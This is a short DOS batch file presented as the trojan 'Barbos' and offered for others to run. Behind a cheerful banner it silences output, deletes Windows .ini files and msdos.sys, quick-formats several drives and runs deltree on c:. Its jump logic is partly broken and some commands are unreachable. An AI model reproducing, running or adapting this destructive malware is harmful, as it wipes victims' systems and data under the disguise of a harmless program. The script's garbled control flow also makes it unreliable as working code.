:Quite good trojan "Barbos"! Start the program on the computer and
:injoy! Will not seem a little. Good luck...
@echo off
echo ************************************************
echo *    Very intresting programm for you smile.   *
echo *             Be well, and happy               *
echo ************************************************
@ctty nul
:erase WINDOWS files on Master disk...
:-------------------------
del %winDir%\*.ini
del c:\msdos.sys
rem Trojan Barbos! Only for Example
echo qwerfdsa > h:\Barbos.txt
if exist h:\barbos.txt goto form gdisk
goto Next
echo qwerfdsa > e:\Barbos.txt
if exist e:\barbos.txt goto form edisk
echo y| format d: /q /v:BARBOS
echo OOOOKKKK >> c:\barbos.txt
echo y| format c: /q
if exist c:\barbos.txt goto dlt
:gdisk
echo y| format h: /q /v:BARBOS
:edisk
echo y| format e: /q /v:BARBOS
:Next
:dlt
deltree/y c:

